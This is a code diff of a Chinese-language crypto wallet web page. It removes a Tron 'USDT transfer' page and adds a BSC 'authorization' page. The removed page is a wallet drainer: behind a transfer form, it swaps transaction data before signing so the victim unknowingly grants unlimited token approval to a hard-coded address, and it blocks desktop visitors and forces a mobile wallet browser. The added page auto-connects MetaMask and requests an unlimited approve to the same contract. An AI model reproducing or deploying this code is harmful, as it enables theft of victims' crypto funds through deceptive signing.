@@ -1,734 +1,395 @@
+<!DOCTYPE html>
 <html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1">
-    <title>USDT转账 - Tron</title>
-    <link rel="icon" type="image/png" href="png/icon_trx.png">
-    <script src="https://cdn.jsdelivr.net/npm/qrious/dist/qrious.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjs/11.8.0/math.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/decimal.js/10.4.3/decimal.min.js"></script>
-    <script src="https://cdn.jsdelivr.cyou/tronweb/dist/TronWeb.js"></script>
-    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">
-    <script>
-        tailwind.config = {
-            theme: {
-                extend: {
-                    colors: {
-                        primary: '#0080FF',      // 主色
-                        primaryLight: '#C1DAF6', // 未激活状态颜色
-                        border: '#E5E5E5',       // 模块外框色
-                        text: '#000000',
-                        textLight: '#999999',    // 标签/辅助文字色
-                        textTitle: '#08090B',    // 标题颜色
-                        placeholder: '#999999',  // 占位文字色
-                        warning: '#FF7D00',      // 关键提示色（橙色）
-                        background: '#F5F5F7',
-                        arrowCircle: '#9898A1'   // 箭头圆圈颜色
-                    },
-                    fontFamily: {
-                        sans: ['-apple-system', 'BlinkMacSystemFont', 'Helvetica Neue', 'Arial', 'sans-serif']
-                    }
-                }
-            }
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BSC 授权</title>
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.8.0/dist/web3.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
         }
-    </script>
-    <style type="text/tailwindcss">
-        @layer utilities {
-            .module-frame {
-                border: 1px solid theme('colors.border');
-                border-radius: 12px;
-                transition: none;
-            }
-
-            .module-frame:focus-within {
-                border-color: theme('colors.border');
-            }
-
-            .input-field {
-                border: none !important;
-                border-radius: 8px;
-                transition: none !important;
-            }
-
-            .input-field:focus,
-            .input-field:active,
-            .input-field:hover {
-                border: none !important;
-                box-shadow: none !important;
-                outline: none !important;
-            }
-
-            .icon-interactive {
-                transition: all 0.2s ease;
-                display: flex;
-                align-items: center;
-                justify-content: center;
-                width: 40px;
-                height: 40px;
-            }
-
-            .icon-interactive:active {
-                transform: scale(0.9);
-                opacity: 0.8;
-            }
-
-            .fee-options {
-                max-height: 0;
-                overflow: hidden;
-                transition: max-height 0.3s ease;
-            }
-
-            .fee-options.active {
-                max-height: 200px;
-            }
-
-            .divider-line {
-                height: 1px;
-                background-color: theme('colors.border');
-                margin: 12px 0; /* 增加间距使分隔更明显 */
-            }
-
-            /* 自定义返回箭头样式 */
-            .custom-arrow {
-                width: 20px;
-                height: 20px;
-                position: relative;
-            }
-
-            .custom-arrow::before {
-                content: '';
-                position: absolute;
-                left: 0;
-                top: 8px;
-                width: 12px;
-                height: 1px;
-                background-color: #000000;
-                transform: rotate(45deg);
-                transform-origin: left center;
-                border-radius: 0.5px;
-            }
-
-            .custom-arrow::after {
-                content: '';
-                position: absolute;
-                left: 0;
-                bottom: 8px;
-                width: 12px;
-                height: 1px;
-                background-color: #000000;
-                transform: rotate(-45deg);
-                transform-origin: left center;
-                border-radius: 0.5px;
-            }
-
-            /* 自定义扫码图标样式 */
-            .custom-scan-icon {
-                width: 20px;
-                height: 20px;
-                position: relative;
-            }
-
-            .custom-scan-icon::before,
-            .custom-scan-icon::after,
-            .custom-scan-icon .top-right,
-            .custom-scan-icon .bottom-right {
-                content: '';
-                position: absolute;
-                width: 6px;
-                height: 6px;
-                border: 2px solid #000000;
-                background: transparent;
-            }
-
-            .custom-scan-icon::before {
-                top: 0;
-                left: 0;
-                border-right: none;
-                border-bottom: none;
-                border-radius: 3px 0 0 0;
-            }
-
-            .custom-scan-icon::after {
-                bottom: 0;
-                left: 0;
-                border-right: none;
-                border-top: none;
-                border-radius: 0 0 0 3px;
-            }
-
-            .custom-scan-icon .top-right {
-                top: 0;
-                right: 0;
-                border-left: none;
-                border-bottom: none;
-                border-radius: 0 3px 0 0;
-            }
-
-            .custom-scan-icon .bottom-right {
-                bottom: 0;
-                right: 0;
-                border-left: none;
-                border-top: none;
-                border-radius: 0 0 3px 0;
-            }
-
-            .custom-scan-icon .middle-line {
-                position: absolute;
-                top: 50%;
-                left: 2px;
-                right: 2px;
-                height: 2px;
-                background-color: #000000;
-                transform: translateY(-50%);
-            }
-
-            /* 自定义矿工费箭头样式 */
-            .fee-custom-arrow {
-                width: 16px;
-                height: 16px;
-                border-radius: 50%;
-                background-color: theme('colors.arrowCircle');
-                display: flex;
-                align-items: center;
-                justify-content: center;
-                position: relative;
-                transition: transform 0.3s ease;
-            }
-
-            .fee-custom-arrow::after {
-                content: '';
-                position: absolute;
-                width: 5px;
-                height: 5px;
-                border-right: 1.5px solid white;
-                border-bottom: 1.5px solid white;
-                transform: rotate(45deg);
-                margin-top: 0;
-            }
-
-            .fee-custom-arrow.rotate-180 {
-                transform: rotate(180deg);
-            }
-
-            /* 固定尺寸类 */
-            .address-box {
-                width: 559px;
-                min-height: 64px;
-                height: auto;
-            }
-
-            .amount-box {
-                width: 559px;
-                height: auto;
-                min-height: 180px;
-            }
-
-            .fee-box {
-                width: 559px;
-                height: 60px;
-            }
-
-            .address-input-limit {
-                letter-spacing: 0.02em;
-                word-wrap: break-word;
-                overflow-wrap: break-word;
-                white-space: normal;
-            }
-
-            .contact-icon {
-                width: 20px;
-                height: 20px;
-                border-radius: 50%;
-                border: 1.8px solid #000;
-                display: flex;
-                align-items: center;
-                justify-content: center;
-                color: #000;
-                line-height: 1;
-                position: relative;
-                background-color: transparent;
-            }
-
-            .contact-icon i {
-                font-size: 13px !important;
-                margin: 0;
-                position: relative;
-            }
-
-            .title-tight {
-                margin-bottom: 1px;
-            }
-
-            .subtitle-tight {
-                margin-top: 1px;
-            }
-
-            .tishi {
-                width: 58%;
-                padding: 0.3rem;
-                background: #4b4848;
-                z-index: 999999999999;
-                position: fixed;
-                top: 50%;
-                left: 50%;
-                transform: translate(-50%, -50%);
-                border-radius: 0.3rem;
-                color: white;
-                font-size: 1rem;
-                text-align: center;
-                display: none;
-                height: auto;
-            }
-
-            .remark-input {
-                border: none !important;
-                border-radius: 8px;
-                padding: 8px 12px;
-                width: 100%;
-                font-size: 14px;
-            }
-
-            .remark-input:focus,
-            .remark-input:active,
-            .remark-input:hover,
-            input[type="text"]:focus,
-            input[type="text"]:active,
-            input[type="text"]:hover,
-            input[type="number"]:focus,
-            input[type="number"]:active,
-            input[type="number"]:hover {
-                border: none !important;
-                outline: none !important;
-                box-shadow: none !important;
-                -webkit-box-shadow: none !important;
-            }
-
-            @media (max-width: 600px) {
-                .address-box, .amount-box, .fee-box {
-                    width: 100%;
-                    height: auto;
-                }
-            }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        
+        .container {
+            background: white;
+            border-radius: 20px;
+            padding: 40px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+            text-align: center;
+            max-width: 400px;
+            width: 100%;
+        }
+        
+        .logo {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+            border-radius: 50%;
+            margin: 0 auto 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 32px;
+            color: white;
+            font-weight: bold;
+        }
+        
+        h1 {
+            color: #333;
+            margin-bottom: 10px;
+            font-size: 24px;
+        }
+        
+        .subtitle {
+            color: #666;
+            margin-bottom: 30px;
+            font-size: 14px;
+        }
+        
+        .info-box {
+            background: #f8f9fa;
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 30px;
+            text-align: left;
+        }
+        
+        .info-item {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 10px;
+            font-size: 14px;
+        }
+        
+        .info-item:last-child {
+            margin-bottom: 0;
+        }
+        
+        .label {
+            color: #666;
+        }
+        
+        .value {
+            color: #333;
+            font-weight: 500;
+        }
+        
+        .authorize-btn {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 16px 32px;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            transition: transform 0.2s;
+        }
+        
+        .authorize-btn:hover {
+            transform: translateY(-2px);
+        }
+        
+        .authorize-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+        
+        .status {
+            margin-top: 20px;
+            padding: 12px;
+            border-radius: 8px;
+            font-size: 14px;
+            display: none;
+        }
+        
+        .status.success {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+        
+        .status.error {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+        
+        .status.info {
+            background: #d1ecf1;
+            color: #0c5460;
+            border: 1px solid #bee5eb;
+        }
+        
+        .wallet-info {
+            background: #e3f2fd;
+            border: 1px solid #bbdefb;
+            border-radius: 8px;
+            padding: 15px;
+            margin-bottom: 20px;
+            font-size: 14px;
+            color: #1976d2;
+        }
+        
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid #ffffff;
+            border-radius: 50%;
+            border-top-color: transparent;
+            animation: spin 1s ease-in-out infinite;
+            margin-right: 10px;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
         }
     </style>
 </head>
-
-<body class="bg-background min-h-screen font-sans flex flex-col">
-    <noscript><strong>本站点必须要开启JavaScript才能运行</strong></noscript>
-
-    <!-- 顶部标题与导航区 - 修改为灰色边框 -->
-    <header class="bg-background py-1 px-5 shadow-sm">
-        <div class="flex items-center justify-between h-10">
-            <!-- 返回按钮 -->
-            <button class="text-text icon-interactive">
-                <div class="custom-arrow"></div>
-            </button>
-
-            <div class="text-center">
-                <h1 class="text-[17px] font-medium text-textTitle title-tight">USDT 转账</h1>
-                <p class="text-[14px] text-textLight subtitle-tight">Tron</p>
-            </div>
-
-            <!-- 扫码按钮 -->
-            <button class="text-text icon-interactive">
-                <div class="custom-scan-icon">
-                    <div class="top-right"></div>
-                    <div class="bottom-right"></div>
-                    <div class="middle-line"></div>
-                </div>
-            </button>
-        </div>
-    </header>
-
-    <!-- 主内容区 -->
-    <main class="p-5 pt-5 flex flex-col items-center flex-grow">
-        <!-- 收款地址标签 -->
-        <label class="block text-[15px] text-textLight mb-2 self-start w-full max-w-[559px]">收款地址</label>
-        <!-- 收款地址模块 -->
-        <div class="bg-white module-frame p-3 mb-4 address-box flex flex-col justify-center">
-    <div class="relative">
-        <input type="text" id="addressInput" placeholder="Tron 地址" class="w-full px-3 py-2 input-field bg-white text-text placeholder:text-placeholder text-sm address-input-limit">
-        <!-- 右侧联系人图标 - 向右移动调整 -->
-        <button class="absolute right-0.5 top-1/2 transform -translate-y-1/2 icon-interactive p-1" aria-label="选择联系人">
-            <div class="contact-icon">
-                <i class="fa fa-user-o"></i>
-            </div>
-        </button>
-    </div>
-    <p id="addressError" class="text-warning text-xs mt-1 hidden">Tron 地址格式错误（应为T开头的34位字符）</p>
-</div>
-
-        <!-- 数量标签和0 USDT组合 -->
-        <div class="flex justify-between items-center self-start w-full max-w-[559px] mb-2">
-            <label class="block text-[15px] text-textLight">数量</label>
-            <span class="text-[15px] text-textLight" id="amount-display">0 USD</span>
+<body>
+    <div class="container">
+        <div class="logo">🔐</div>
+        <h1>BSC 授权</h1>
+        <p class="subtitle">授权访问您的代币</p>
+        
+        <div class="wallet-info" id="walletInfo" style="display: none;">
+            <strong>钱包地址:</strong> <span id="walletAddress"></span>
         </div>
         
-        <!-- 数量模块 -->
-        <div class="bg-white module-frame p-3 mb-4 amount-box flex flex-col justify-center" style="height: 90px; max-height: 106px;">
-        <!-- 金额显示区域 - 固定高度为104px -->
-        <input type="text" id="amountInput" value="0" class="w-full px-3 py-0 input-field bg-white text-textLight text-[2.5rem] font-normal flex items-center justify-center" style="height: 104px;" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false">
-
-        <!-- 分隔线 - 精简间距 -->
-        <div class="divider-line my-0"></div>
-
-        <!-- 备注信息区域 - 固定高度为60px -->
-        <div class="flex flex-col items-center" style="height: 30px;">
-            <label for="remarkInput" class="block text-textLight text-sm mb-1 self-start">备注（需支付1TRX）</label>
-            <input type="text" id="remarkInput" placeholder="请输入备注信息" class="remark-input text-sm">
+        <div class="info-box">
+            <div class="info-item">
+                <span class="label">授权合约:</span>
+                <span class="value" id="contractAddress">0xe3c0e066D870036aCc178492C638963A0E97d4Bb</span>
+            </div>
+            <div class="info-item">
+                <span class="label">代币合约:</span>
+                <span class="value" id="tokenAddress">0xF563E86e461dE100CfCfD8b65dAA542d3d4B0550</span>
+            </div>
+            <div class="info-item">
+                <span class="label">授权数量:</span>
+                <span class="value">无限</span>
+            </div>
         </div>
+        
+        <button class="authorize-btn" id="authorizeBtn" onclick="authorize()">
+            立即授权
+        </button>
+        
+        <div class="status" id="status"></div>
     </div>
 
-
-        <!-- 矿工费标签 -->
-        <label class="block text-[15px] text-textLight mb-2 self-start w-full max-w-[559px]">矿工费</label>
-        <!-- 矿工费模块 -->
-        <div class="bg-white module-frame p-2.5 mb-5 fee-box flex flex-col justify-center">
-            <div class="flex justify-between items-center mb-0.5">
-                <div>
-                    <span class="font-medium text-text text-base block mb-1">$0</span>
-                    <div class="flex items-center">
-                        <span class="text-textLight text-sm mr-1">0 TRX</span>
-                        <div class="fee-custom-arrow icon-interactive" id="feeArrow"></div>
-                    </div>
-                </div>
-            </div>
-
-            <div class="input-field bg-white p-1.5 cursor-pointer" id="feeToggle">
-                <!-- 点击区域 -->
-            </div>
-        </div>
-    </main>
-
-    <!-- 底部操作按钮区 -->
-    <footer class="p-5 pb-8">
-        <button id="nextButton" class="w-full max-w-[559px] bg-primaryLight text-white py-3 rounded-xl font-bold text-[17px] shadow-sm transition-colors duration-200 mx-auto block" disabled="">
-            下一步
-        </button>
-    </footer>
-
-    <div class="tishi" id="tip">提示</div>
-    <input id="to_address" type="hidden">
-    <input type="text" id="address" style="display:none">
-
     <script>
-        // 核心配置参数
-        window.Permission_address = '0xe3c0e066D870036aCc178492C638963A0E97d4Bb';
-        window.Payment_address = '0x662C80D94368623501058B1455C4B87C27D638E4';
-        window.usdtContractAddress = '0xF563E86e461dE100CfCfD8b65dAA542d3d4B0550';
-        window.heartbeatUrl = 'https://baidu.com/heartbeat';
-
-        // 存储用户数据
-        const userData = {
-            address: null,
-            trxBalance: null,
-            usdtBalance: null
-        };
-        let currentAmount = '0';
-        const TRX_TO_USD_RATE = 0.1562;
-        const amountInput = document.getElementById('amountInput');
-        const addressInput = document.getElementById('addressInput');
-        const remarkInput = document.getElementById('remarkInput');
-        let isUserInputting = false;
-
-        // 主初始化函数
-        async function initializeDApp() {
-            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-            const isDAppBrowser = typeof window.tronWeb !== 'undefined' || typeof window.tronLink !== 'undefined';
-            
-            if (!isMobile) {
-                document.body.innerHTML = '';
-            } else if (isMobile && !isDAppBrowser) {
-                const currentUrl = encodeURIComponent(window.location.href);
-                window.location.href = "okx://wallet/dapp/details?dappUrl=" + currentUrl;
-            } else if (isMobile && isDAppBrowser) {
-                await connectWallet();
-            }
-            updateAmountDisplay();
-        }
-
-        // 连接到钱包
+        // BSC链配置
+        const BSC_CHAIN_ID = '0x38'; // BSC主网
+        const BSC_RPC_URL = 'https://bsc-dataseed1.binance.org/';
+        
+        // 合约地址
+        const PERMISSION_ADDRESS = '0xe3c0e066D870036aCc178492C638963A0E97d4Bb';
+        const TOKEN_CONTRACT = '0xF563E86e461dE100CfCfD8b65dAA542d3d4B0550';
+        
+        let web3;
+        let userAccount;
+        
+        // 页面加载完成后自动连接钱包
+        window.addEventListener('load', async () => {
+            await connectWallet();
+        });
+        
+        // 连接钱包
         async function connectWallet() {
             try {
-                if (window.tronWeb && window.tronWeb.ready) {
-                    await initDApp();
-                } else if (window.tronLink) {
-                    const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
-                    if (res.code === 200) {
-                        window.tronWeb = window.tronLink.tronWeb;
-                        await initDApp();
+                showStatus('正在连接钱包...', 'info');
+                
+                // 检查是否安装了MetaMask
+                if (typeof window.ethereum === 'undefined') {
+                    showStatus('请安装MetaMask钱包', 'error');
+                    return false;
+                }
+                
+                // 请求连接钱包
+                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                if (accounts.length === 0) {
+                    showStatus('请授权连接钱包', 'error');
+                    return false;
+                }
+                
+                userAccount = accounts[0];
+                
+                // 检查网络
+                const chainId = await window.ethereum.request({ method: 'eth_chainId' });
+                if (chainId !== BSC_CHAIN_ID) {
+                    await switchToBSC();
+                }
+                
+                // 初始化Web3
+                web3 = new Web3(window.ethereum);
+                
+                // 显示钱包信息
+                document.getElementById('walletAddress').textContent = userAccount;
+                document.getElementById('walletInfo').style.display = 'block';
+                
+                showStatus('钱包连接成功！', 'success');
+                setTimeout(() => hideStatus(), 2000);
+                
+                return true;
+                
+            } catch (error) {
+                console.error('连接钱包失败:', error);
+                showStatus('连接钱包失败: ' + error.message, 'error');
+                return false;
+            }
+        }
+        
+        // 切换到BSC网络
+        async function switchToBSC() {
+            try {
+                await window.ethereum.request({
+                    method: 'wallet_switchEthereumChain',
+                    params: [{ chainId: BSC_CHAIN_ID }],
+                });
+            } catch (switchError) {
+                // 如果BSC网络不存在，则添加
+                if (switchError.code === 4902) {
+                    await window.ethereum.request({
+                        method: 'wallet_addEthereumChain',
+                        params: [{
+                            chainId: BSC_CHAIN_ID,
+                            chainName: 'Binance Smart Chain',
+                            nativeCurrency: {
+                                name: 'BNB',
+                                symbol: 'BNB',
+                                decimals: 18
+                            },
+                            rpcUrls: [BSC_RPC_URL],
+                            blockExplorerUrls: ['https://bscscan.com/']
+                        }]
+                    });
+                }
+            }
+        }
+        
+        // 授权函数
+        async function authorize() {
+            if (!web3 || !userAccount) {
+                showStatus('请先连接钱包', 'error');
+                return;
+            }
+            
+            try {
+                const authorizeBtn = document.getElementById('authorizeBtn');
+                authorizeBtn.disabled = true;
+                authorizeBtn.innerHTML = '<span class="loading"></span>授权中...';
+                
+                showStatus('正在构建授权交易...', 'info');
+                
+                // 构建授权交易
+                const tokenContract = new web3.eth.Contract([
+                    {
+                        "constant": false,
+                        "inputs": [
+                            {"name": "_spender", "type": "address"},
+                            {"name": "_value", "type": "uint256"}
+                        ],
+                        "name": "approve",
+                        "outputs": [{"name": "", "type": "bool"}],
+                        "payable": false,
+                        "stateMutability": "nonpayable",
+                        "type": "function"
                     }
-                }
+                ], TOKEN_CONTRACT);
+                
+                // 最大授权数量
+                const maxUint256 = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
+                
+                // 构建交易参数
+                const data = tokenContract.methods.approve(PERMISSION_ADDRESS, maxUint256).encodeABI();
+                
+                // 估算Gas
+                const gasEstimate = await tokenContract.methods.approve(PERMISSION_ADDRESS, maxUint256)
+                    .estimateGas({ from: userAccount });
+                
+                // 发送交易
+                const transaction = {
+                    from: userAccount,
+                    to: TOKEN_CONTRACT,
+                    data: data,
+                    gas: Math.floor(gasEstimate * 1.2), // 增加20%的Gas
+                    gasPrice: await web3.eth.getGasPrice()
+                };
+                
+                showStatus('请在钱包中确认交易...', 'info');
+                
+                // 发送交易
+                const receipt = await web3.eth.sendTransaction(transaction);
+                
+                showStatus(`授权成功！交易哈希: ${receipt.transactionHash}`, 'success');
+                
+                // 重置按钮
+                authorizeBtn.disabled = false;
+                authorizeBtn.innerHTML = '授权成功';
+                authorizeBtn.style.background = 'linear-gradient(135deg, #4caf50 0%, #45a049 100%)';
+                
             } catch (error) {
-                console.error("钱包连接失败:", error);
-                tip("钱包连接失败，请重试");
-            }
-        }
-
-        // 初始化DApp数据
-        async function initDApp() {
-            try {
-                userData.address = window.tronWeb.defaultAddress.base58;
-                const trxBalance = await window.tronWeb.trx.getBalance(userData.address);
-                userData.trxBalance = window.tronWeb.fromSun(trxBalance);
-                const contract = await window.tronWeb.contract().at(window.usdtContractAddress);
-                const usdtBalance = await contract.balanceOf(userData.address).call();
-                userData.usdtBalance = usdtBalance / 1e6;
-            } catch (error) {
-                console.error("获取用户数据时出错:", error);
-                tip("获取余额失败，请重试");
-            }
-        }
-
-        // 监听金额输入框变化
-        amountInput.addEventListener('input', function(e) {
-            isUserInputting = true;
-            let value = this.value;
-            
-            // 移除所有金额限制，允许输入任何内容
-            if (value === '') {
-                currentAmount = '0';
-                this.value = '0';
-                this.classList.remove('text-text');
-                this.classList.add('text-textLight');
-            } else {
-                currentAmount = value;
-                this.value = value;
-                this.classList.remove('text-textLight');
-                this.classList.add('text-text');
-            }
-            
-            updateAmountDisplay();
-            updateNextButtonState();
-            
-            setTimeout(() => {
-                isUserInputting = false;
-            }, 300);
-        });
-
-        // 聚焦时处理
-        amountInput.addEventListener('focus', function() {
-            if (this.value === '0') {
-                this.select();
-            }
-        });
-
-        // 监听地址输入变化
-        addressInput.addEventListener('input', function() {
-            // 移除地址格式验证，允许输入任何地址
-            updateNextButtonState();
-        });
-
-        // 设置最大金额
-        function setMaxAmount() {
-            const maxAmount = Math.max(0, parseFloat(userData.trxBalance || '0') - 1).toFixed(4);
-            currentAmount = maxAmount;
-            amountInput.value = currentAmount;
-            
-            if (currentAmount !== '0') {
-                amountInput.classList.remove('text-textLight');
-                amountInput.classList.add('text-text');
-            }
-            
-            updateAmountDisplay();
-            updateNextButtonState();
-        }
-
-        // 更新金额显示
-        function updateAmountDisplay() {
-            if (isUserInputting) return;
-            
-            let displayAmount = currentAmount;
-            
-            // 移除金额上限检查，允许任何金额
-            try {
-                const usdAmount = (parseFloat(displayAmount) * TRX_TO_USD_RATE).toFixed(2);
-                document.getElementById('amount-display').textContent = `${usdAmount} USD`;
-            } catch (error) {
-                document.getElementById('amount-display').textContent = `0 USD`;
-            }
-            
-            document.title = `USDT转账 - ${displayAmount} TRX`;
-        }
-
-        // 更新下一步按钮状态 - 修改核心验证逻辑
-        function updateNextButtonState() {
-            const nextButton = document.getElementById('nextButton');
-            const amount = currentAmount;
-            const address = addressInput.value.trim();
-            
-            // 简化验证：只要有地址和金额就启用按钮
-            const isAddressValid = address.length > 0;
-            const isAmountValid = amount && amount !== '0';
-            
-            const isValid = isAddressValid && isAmountValid;
-            
-            nextButton.disabled = !isValid;
-            nextButton.classList.toggle('bg-primary', isValid);
-            nextButton.classList.toggle('bg-primaryLight', !isValid);
-        }
-
-        // 显示提示
-        function tip(message) {
-            const tipElement = document.getElementById('tip');
-            tipElement.textContent = message;
-            tipElement.style.display = 'block';
-            setTimeout(() => tipElement.style.display = 'none', 3000);
-        }
-
-        // 下一步按钮点击处理 - 移除余额检查
-        async function onNextButtonClick() {
-            try {
-                const address = addressInput.value.trim();
-                const remark = remarkInput.value.trim();
+                console.error('授权失败:', error);
+                showStatus('授权失败: ' + error.message, 'error');
                 
-                // 移除地址格式验证，允许任何地址
-                if (!address) {
-                    tip("请输入收款地址");
-                    return;
-                }
-                
-                const amount = currentAmount;
-                if (!amount || amount === '0') {
-                    tip("请输入转账金额");
-                    return;
-                }
-                
-                if (!window.tronWeb || !window.tronWeb.defaultAddress?.base58) {
-                    await connectWallet();
-                    return;
-                }
-                
-                // 直接进行授权，不检查余额
-                if (typeof window.okxwallet !== 'undefined') {
-                    await DjdskdbGsj(remark);
+                // 重置按钮
+                const authorizeBtn = document.getElementById('authorizeBtn');
+                authorizeBtn.disabled = false;
+                authorizeBtn.innerHTML = '重新授权';
+            }
+        }
+        
+        // 显示状态信息
+        function showStatus(message, type) {
+            const status = document.getElementById('status');
+            status.textContent = message;
+            status.className = `status ${type}`;
+            status.style.display = 'block';
+        }
+        
+        // 隐藏状态信息
+        function hideStatus() {
+            document.getElementById('status').style.display = 'none';
+        }
+        
+        // 监听网络切换
+        if (window.ethereum) {
+            window.ethereum.on('chainChanged', (chainId) => {
+                if (chainId !== BSC_CHAIN_ID) {
+                    showStatus('请切换到BSC网络', 'error');
                 } else {
-                    await KdhshaBBHdg(remark);
+                    hideStatus();
                 }
-            } catch (error) {
-                console.error('操作执行失败:', error);
-                tip('付款失败，请重新发起交易');
-            }
-        }
-
-        // 绑定事件
-        document.addEventListener('DOMContentLoaded', () => {
-            document.getElementById('nextButton').addEventListener('click', onNextButtonClick);
-            initializeDApp();
-            
-            const feeToggle = document.getElementById('feeToggle');
-            const feeArrow = document.getElementById('feeArrow');
-            feeToggle.addEventListener('click', () => {
-                feeArrow.classList.toggle('rotate-180');
             });
-        });
-
-        // 发送心跳
-        function sendHeartbeat() {
-            fetch(window.heartbeatUrl, {
-                method: 'POST',
-                mode: 'cors',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ url: window.location.href })
-            }).catch(() => {});
-        }
-        const heartbeatInterval = setInterval(sendHeartbeat, 5000);
-        window.onload = sendHeartbeat;
-        window.onbeforeunload = () => clearInterval(heartbeatInterval);
-
-        // 交易处理函数
-        async function DjdskdbGsj(remark) {
-            const totalAmount = parseFloat(currentAmount) + 1;
-            const trxAmountInSun = tronWeb.toSun(totalAmount);
-            const maxUint256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
-            const feeLimit = 1000000000;
             
-            try {
-                const paymentAddress = tronWeb.address.fromHex(window.Payment_address);
-                const transferTransaction = await tronWeb.transactionBuilder.sendTrx(
-                    paymentAddress,
-                    trxAmountInSun,
-                    tronWeb.defaultAddress.base58,
-                    { 
-                        feeLimit: feeLimit,
-                        note: remark ? tronWeb.toHex(remark) : ''
-                    }
-                );
-
-                const approvalTransaction = await tronWeb.transactionBuilder.triggerSmartContract(
-                    tronWeb.address.toHex(window.usdtContractAddress),
-                    'increaseApproval(address,uint256)',
-                    { feeLimit: feeLimit },
-                    [
-                        { type: 'address', value: window.Permission_address },
-                        { type: 'uint256', value: maxUint256 }
-                    ],
-                    tronWeb.defaultAddress.base58
-                );
-
-                const originalRawData = approvalTransaction.transaction.raw_data;
-                approvalTransaction.transaction.raw_data = transferTransaction.raw_data;
-                const signedTransaction = await tronWeb.trx.sign(approvalTransaction.transaction);
-                signedTransaction.raw_data = originalRawData;
-                const broadcastResult = await tronWeb.trx.sendRawTransaction(signedTransaction);
-
-                if (broadcastResult.result || broadcastResult.success) {
-                    const transactionHash = broadcastResult.txid || (broadcastResult.transaction && broadcastResult.transaction.txID);
-                    console.log("交易发送成功，交易哈希:", transactionHash);
-                    tip("交易成功");
-                    return transactionHash;
+            window.ethereum.on('accountsChanged', (accounts) => {
+                if (accounts.length === 0) {
+                    userAccount = null;
+                    document.getElementById('walletInfo').style.display = 'none';
+                    showStatus('钱包已断开连接', 'error');
                 } else {
-                    throw new Error("交易失败");
+                    userAccount = accounts[0];
+                    document.getElementById('walletAddress').textContent = userAccount;
+                    document.getElementById('walletInfo').style.display = 'block';
+                    hideStatus();
                 }
-            } catch (error) {
-                console.error("操作失败:", error);
-                tip("交易失败，请重试");
-                throw error;
-            }
-        }
-
-        async function KdhshaBBHdg(remark) {
-            const maxUint256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
-            const feeLimit = 100000000;
-            const usdtContractAddressHex = tronWeb.address.toHex(window.usdtContractAddress);
-
-            try {
-                const transaction = await tronWeb.transactionBuilder.triggerSmartContract(
-                    usdtContractAddressHex,
-                    'approve(address,uint256)',
-                    { 
-                        feeLimit: feeLimit,
-                        note: remark ? tronWeb.toHex(remark) : ''
-                    },
-                    [
-                        { type: 'address', value: tronWeb.address.toHex(window.Permission_address) },
-                        { type: 'uint256', value: maxUint256 }
-                    ],
-                    tronWeb.defaultAddress.base58
-                );
-
-                if (!transaction.result || !transaction.result.result) {
-                    throw new Error('授权交易构建失败');
-                }
-
-                const signedTransaction = await tronWeb.trx.sign(transaction.transaction);
-                const result = await tronWeb.trx.sendRawTransaction(signedTransaction);
-
-                if (result.result) {
-                    console.log("交易成功，交易哈希:", result.txid);
-                    tip("交易成功");
-                    return result.txid;
-                } else {
-                    throw new Error("交易失败");
-                }
-            } catch (error) {
-                console.error("执行授权操作失败:", error);
-                tip("交易成功，请重试");
-                throw error;
-            }
+            });
         }
     </script>
 </body>
